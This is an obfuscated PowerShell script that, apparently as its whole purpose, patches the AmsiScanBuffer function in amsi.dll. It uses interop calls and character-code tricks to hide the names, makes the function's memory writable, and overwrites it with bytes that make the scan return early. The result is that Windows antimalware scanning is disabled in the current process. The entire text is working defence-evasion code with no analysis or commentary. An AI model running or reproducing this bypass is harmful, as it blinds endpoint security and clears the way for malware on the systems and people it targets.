$a3EYzCBRaSrFu = @"
using System;
using System.Runtime.InteropServices;
public class a3EYzCBRaSrFu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr npWeA_, string n2Y0);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr C5mMkHhhZbVRXKpn7, UIntPtr z2YEruVeWDMVDipB, uint Xs6Le30V5AYARuh, out uint tuWHbGudB22BaA9Elh);
}
"@

Add-Type $a3EYzCBRaSrFu

$XVpdB1z_Imc1sdzyudq = [a3EYzCBRaSrFu]::LoadLibrary("$(('äm'+'sî'+'.d'+'ll').NoRmALIze([cHAR](70*29/29)+[CHAR](111*58/58)+[CHAr](114+109-109)+[CHaR]([bYTe]0x6d)+[chAr]([BYTE]0x44)) -replace [char]([BYTE]0x5c)+[cHar](112+4-4)+[cHaR](123+92-92)+[chaR]([BYte]0x4d)+[chAR](110)+[chAR]([bYTe]0x7d))")
$_mTu4gJR = [a3EYzCBRaSrFu]::GetProcAddress($XVpdB1z_Imc1sdzyudq, "$(('ÀmsíScânBûff'+'ér').NorMAlIze([cHAr]([BYtE]0x46)+[CHaR](97+14)+[CHAR](114*19/19)+[CHAR]([byTE]0x6d)+[ChAR](68*6/6)) -replace [char]([BYTE]0x5c)+[Char](112+39-39)+[chAR](39+84)+[ChAr]([bYtE]0x4d)+[cHAr](110)+[ChAR](125))")
$p = 0
[a3EYzCBRaSrFu]::VirtualProtect($_mTu4gJR, [uint32]5, 0x40, [ref]$p)
$HeBo = "0xB8"
$ACTL3y = "0x57"
$_cmcfRrNHbY = "0x00"
$wWk2_vnUPM = "0x07"
$dvnrlVMgXUcI = "0x80"
$DclycFItDCn = "0xC3"
$sEau = [Byte[]] ($HeBo,$ACTL3y,$_cmcfRrNHbY,$wWk2_vnUPM,+$dvnrlVMgXUcI,+$DclycFItDCn)
[System.Runtime.InteropServices.Marshal]::Copy($sEau, 0, $_mTu4gJR, 6)